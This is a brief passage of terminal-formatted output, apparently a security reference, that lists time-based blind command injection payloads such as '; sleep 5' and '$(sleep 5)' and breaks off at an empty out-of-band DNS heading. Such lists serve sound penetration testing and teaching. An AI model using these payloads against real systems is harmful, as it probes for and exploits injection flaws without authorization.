[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Common Blind Command Injection Techniques                                [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Time-based:**                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ; sleep 5                                                                    [34m│[0m
[34m│[0m | sleep 5                                                                    [34m│[0m
[34m│[0m || sleep 5                                                                   [34m│[0m
[34m│[0m & sleep 5 &                                                                  [34m│[0m
[34m│[0m $(sleep 5)                                                                   [34m│[0m
[34m│[0m `sleep 5`                                                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Out-of-band (DNS):**                                                       [34m│[0m
